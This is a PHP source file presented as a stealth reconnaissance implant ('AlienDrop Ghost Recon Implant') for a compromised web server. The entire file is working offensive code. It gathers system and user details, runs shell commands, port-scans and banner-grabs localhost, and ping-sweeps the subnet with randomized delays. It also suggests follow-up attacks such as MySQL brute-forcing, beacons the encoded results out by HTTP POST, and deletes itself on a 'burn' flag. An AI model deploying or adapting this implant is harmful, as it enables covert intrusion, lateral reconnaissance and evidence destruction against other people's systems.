<?php
// MINC - AlienDrop Ghost Recon Implant (Final Stealth Recon v4)

header("Content-Type: text/plain");

$beacon_enabled = true;
$beacon_url = "http://{$_SERVER['HTTP_HOST']}/local_recon.php";

$passive = isset($_GET['passive']) && $_GET['passive'] === 'true';
$deep = isset($_GET['deep']) && $_GET['deep'] === 'true';
$burn = isset($_GET['burn']) && $_GET['burn'] === 'true';

function get_basic_info() {
    return [
        'hostname' => @gethostname(),
        'os'       => @php_uname(),
        'user'     => @get_current_user(),
        'uid'      => function_exists('posix_geteuid') ? @posix_geteuid() : 'n/a',
        'groups'   => function_exists('posix_getgroups') ? @posix_getgroups() : [],
        'cwd'      => @getcwd(),
        'arch'     => php_uname('m'),
    ];
}

function get_ip_info() {
    $ips = [];
    $interfaces = @shell_exec("ip a 2>/dev/null || ifconfig 2>/dev/null");
    preg_match_all('/inet\s([0-9.]+)/', $interfaces, $matches);
    foreach ($matches[1] as $ip) {
        if ($ip !== "127.0.0.1" && preg_match('/^192\.168|10\./', $ip)) {
            $ips[] = $ip;
        }
    }
    return $ips;
}

function get_loaded_important_exts() {
    $exts = @get_loaded_extensions();
    $watch = ['curl', 'mysqli', 'openssl', 'pdo', 'ldap', 'mbstring', 'zip'];
    return array_intersect($exts, $watch);
}

function scan_ports() {
    $open = [];
    $ports = [
        21 => 'ftp', 22 => 'ssh', 23 => 'telnet', 25 => 'smtp',
        53 => 'dns', 80 => 'http', 110 => 'pop3', 143 => 'imap',
        443 => 'https', 3306 => 'mysql', 8080 => 'proxy'
    ];
    foreach ($ports as $p => $svc) {
        $sock = @fsockopen("127.0.0.1", $p, $e, $e2, 0.05);
        if ($sock) {
            $banner = "";
            if ($deep && in_array($p, [80, 443])) {
                @fputs($sock, "GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n");
                $banner = @fread($sock, 128);
            }
            $open[] = ["port" => $p, "service" => $svc, "banner" => trim($banner)];
            fclose($sock);
        }
    }
    return $open;
}

function subnet_scan($base, $deepdns = false) {
    $live = [];
    for ($i = 1; $i <= 254; $i++) {
        $ip = "$base.$i";
        $ping = @exec("ping -c 1 -W 1 $ip 2>/dev/null | grep ttl");
        if ($ping) {
            $entry = ["ip" => $ip];
            if ($deepdns) {
                $rdns = @gethostbyaddr($ip);
                if ($rdns && $rdns !== $ip) {
                    $entry['rdns'] = $rdns;
                }
            }
            $live[] = $entry;
        }
        usleep(rand(10000, 50000));
    }
    return $live;
}

function stealth_output($data) {
    $encoded = base64_encode(json_encode($data));
    echo "SCAN_RESULT:" . $encoded;
}

function beacon_result($data, $url) {
    $post = "data=" . urlencode(base64_encode(json_encode($data)));
    $ch = @curl_init();
    @curl_setopt($ch, CURLOPT_URL, $url);
    @curl_setopt($ch, CURLOPT_POST, 1);
    @curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    @curl_setopt($ch, CURLOPT_TIMEOUT, 4);
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    @curl_exec($ch);
    @curl_close($ch);
}

function suggest_tasks($ports) {
    $tasks = [];
    foreach ($ports as $p) {
        if ($p['port'] === 3306) $tasks[] = "mysql_brute";
        if ($p['port'] === 21) $tasks[] = "ftp_enum";
        if ($p['port'] === 80 || $p['port'] === 443) $tasks[] = "web_recon";
    }
    return array_unique($tasks);
}

// === RUN ===

$sys = get_basic_info();
$ips = get_ip_info();
$hash = substr(sha1($sys['hostname'] . $sys['os'] . $sys['user']), 0, 12);

$recon = [
    'system'         => $sys,
    'local_ips'      => $ips,
    'php_exts'       => get_loaded_important_exts(),
    'open_ports'     => scan_ports(),
    'timestamp'      => time(),
    'recon_id'       => $hash,
    'passive_mode'   => $passive,
    'deep_mode'      => $deep,
    'suggested_tasks'=> suggest_tasks(scan_ports())
];

// Subnet enumeration (with optional reverse DNS)
if (!$passive && isset($ips[0])) {
    $parts = explode(".", $ips[0]);
    $base = "{$parts[0]}.{$parts[1]}.{$parts[2]}";
    $recon['subnet_hosts'] = subnet_scan($base, $deep);
}

// Beacon if enabled
if ($beacon_enabled && !$passive) {
    beacon_result($recon, $beacon_url);
}

// Output
stealth_output($recon);

// Self-delete if burn enabled
if ($burn) {
    @unlink(__FILE__);
}
?>

